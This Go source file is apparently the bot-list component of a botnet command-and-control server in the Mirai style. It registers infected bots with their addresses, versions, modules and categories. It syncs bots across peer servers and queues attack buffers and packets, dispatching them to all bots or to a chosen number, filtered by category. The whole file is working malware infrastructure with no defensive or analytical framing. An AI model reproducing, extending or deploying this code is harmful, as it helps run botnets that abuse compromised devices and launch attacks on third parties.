package main

import (
	"fmt"
	"math/rand"
	"sync"
	"time"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type PktSend struct {
	pktType uint8
	payload []byte
	count   int
	botCata string
}

type BotDetail struct {
	Uid        int
	Addr       string
	Source     string
	Version    string
	Modules    []string
	CapFlags   string
	RemoteID   int
}

type remoteDelRequest struct {
	uid    int
	peerID int
}

type ClientList struct {
	uid         int
	count       int
	clients     map[int]*Bot
	addQueue    chan *Bot
	delQueue    chan *Bot
	remoteAdd   chan *Bot
	remoteDel   chan *remoteDelRequest
	atkQueue    chan *AttackSend
	pktQueue    chan *PktSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	detailsReq  chan int
	detailsRes  chan []BotDetail
	cntMutex    *sync.Mutex
	forEachReq  chan *forEachRequest
}

type forEachRequest struct {
	fn   func(*Bot)
	done chan struct{}
}

func NewClientList() *ClientList {
	cl := &ClientList{
		uid:         0,
		count:       0,
		clients:     make(map[int]*Bot),
		addQueue:    make(chan *Bot, 128),
		delQueue:    make(chan *Bot, 128),
		remoteAdd:   make(chan *Bot, 128),
		remoteDel:   make(chan *remoteDelRequest, 128),
		atkQueue:    make(chan *AttackSend, 128),
		pktQueue:    make(chan *PktSend, 128),
		totalCount:  make(chan int, 64),
		cntView:     make(chan int),
		distViewReq: make(chan int),
		distViewRes: make(chan map[string]int),
		detailsReq:  make(chan int),
		detailsRes:  make(chan []BotDetail),
		cntMutex:    &sync.Mutex{},
		forEachReq:  make(chan *forEachRequest, 64),
	}
	go cl.worker()
	go cl.fastCountWorker()
	return cl
}

func (this *ClientList) Count() int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.cntView <- 0
	return <-this.cntView
}

func (this *ClientList) Distribution() map[string]int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.distViewReq <- 0
	return <-this.distViewRes
}

func (this *ClientList) GetBotInfo(index int) (string, string, string) {
	for _, v := range this.clients {
		if v.uid == index {
			return v.conn.RemoteAddr().String(), v.source, fmt.Sprintf("%d", v.version)
		}
	}
	return "", "", ""
}

func (this *ClientList) BotDetails() []BotDetail {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.detailsReq <- 0
	return <-this.detailsRes
}

func (this *ClientList) BotCount() int {
	return this.count
}

func (this *ClientList) AddClient(c *Bot) {
	this.addQueue <- c
}

func (this *ClientList) DelClient(c *Bot) {
	this.delQueue <- c
}

func (this *ClientList) AddRemote(bot *Bot) {
	this.remoteAdd <- bot
}

func (this *ClientList) DelRemote(uid, peerID int) {
	this.remoteDel <- &remoteDelRequest{uid: uid, peerID: peerID}
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	this.atkQueue <- &AttackSend{buf, maxbots, botCata}
}

func (this *ClientList) QueuePkt(pktType uint8, payload []byte, maxbots int, botCata string) {
	this.pktQueue <- &PktSend{pktType, payload, maxbots, botCata}
}

func (this *ClientList) ForEachClient(fn func(*Bot)) {
	req := &forEachRequest{fn: fn, done: make(chan struct{})}
	this.forEachReq <- req
	<-req.done
}

func (this *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-this.totalCount:
			this.count += delta
		case <-this.cntView:
			this.cntView <- this.count
		}
	}
}

func (this *ClientList) worker() {
	rand.Seed(time.Now().UTC().UnixNano())
	for {
		select {
		case add := <-this.addQueue:
			this.totalCount <- 1
			this.uid++
			add.uid = this.uid
			this.clients[add.uid] = add
			if peerMgr != nil && !add.isDns && add.remoteID == 0 {
				peerMgr.BroadcastBotJoin(add)
			}
		case del := <-this.delQueue:
			this.totalCount <- -1
			if peerMgr != nil && del.remoteID == 0 {
				peerMgr.BroadcastBotLeave(del)
			}
			delete(this.clients, del.uid)
		case bot := <-this.remoteAdd:
			this.totalCount <- 1
			this.uid++
			bot.uid = this.uid
			bot.conn = nil // remote bots have no local connection
			this.clients[bot.uid] = bot
		case req := <-this.remoteDel:
			for uid, bot := range this.clients {
				if bot.remoteID == req.peerID && (req.uid == 0 || bot.remoteUID == req.uid) {
					this.totalCount <- -1
					delete(this.clients, uid)
					break
				}
			}
		case atk := <-this.atkQueue:
			sent := 0
			if atk.count == -1 {
				for _, v := range this.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						if v.conn != nil {
							v.QueueBuf(atk.buf)
						}
						sent++
					}
				}
			} else {
				var count int
				for _, v := range this.clients {
					if count > atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						if v.conn != nil {
							v.QueueBuf(atk.buf)
						}
						count++
						sent++
					}
				}
			}
		case pkt := <-this.pktQueue:
			sent := 0
			if pkt.count == -1 {
				for _, v := range this.clients {
					if pkt.botCata == "" || pkt.botCata == v.source {
						if v.conn != nil {
							v.SendPkt(pkt.pktType, pkt.payload)
						}
						sent++
					}
				}
			} else {
				var count int
				for _, v := range this.clients {
					if count > pkt.count {
						break
					}
					if pkt.botCata == "" || pkt.botCata == v.source {
						if v.conn != nil {
							v.SendPkt(pkt.pktType, pkt.payload)
						}
						count++
						sent++
					}
				}
			}
		case <-this.cntView:
			this.cntView <- this.count
		case <-this.distViewReq:
			res := make(map[string]int)
			for _, v := range this.clients {
				res[v.source]++
			}
			this.distViewRes <- res
		case <-this.detailsReq:
			var res []BotDetail
			for _, v := range this.clients {
				addr := ""
				if v.conn != nil {
					addr = v.conn.RemoteAddr().String()
				}
				res = append(res, BotDetail{
					Uid:      v.uid,
					Addr:     addr,
					Source:   v.source,
					Version:  v.versionStr,
					Modules:  v.modules,
					CapFlags: v.capFlags,
					RemoteID: v.remoteID,
				})
			}
			this.detailsRes <- res
		case req := <-this.forEachReq:
			for _, v := range this.clients {
				req.fn(v)
			}
			close(req.done)
		}
	}
}
